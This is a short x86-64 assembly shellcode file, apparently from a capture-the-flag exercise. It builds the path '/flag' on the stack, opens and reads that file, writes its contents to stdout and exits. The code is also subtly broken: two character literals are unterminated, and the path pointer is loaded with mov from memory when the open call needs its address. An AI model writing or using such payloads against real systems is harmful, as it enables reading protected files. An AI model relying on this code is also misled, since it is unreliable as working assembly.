.intel_syntax noprefix
.global _start
_start:
mov BYTE PTR [rsp+16], '/'
mov BYTE PTR [rsp+17], 'f
mov BYTE PTR [rsp+18], 'l'
mov BYTE PTR [rsp+19], 'a
mov BYTE PTR [rsp+20], 'g'
mov BYTE PTR [rsp+21], 0

mov rdi, [rsp+16]
mov rsi, 0
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 128
mov rax, 0
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, rax
mov rax, 1
syscall

mov rdi, 42
mov rax, 60
syscall
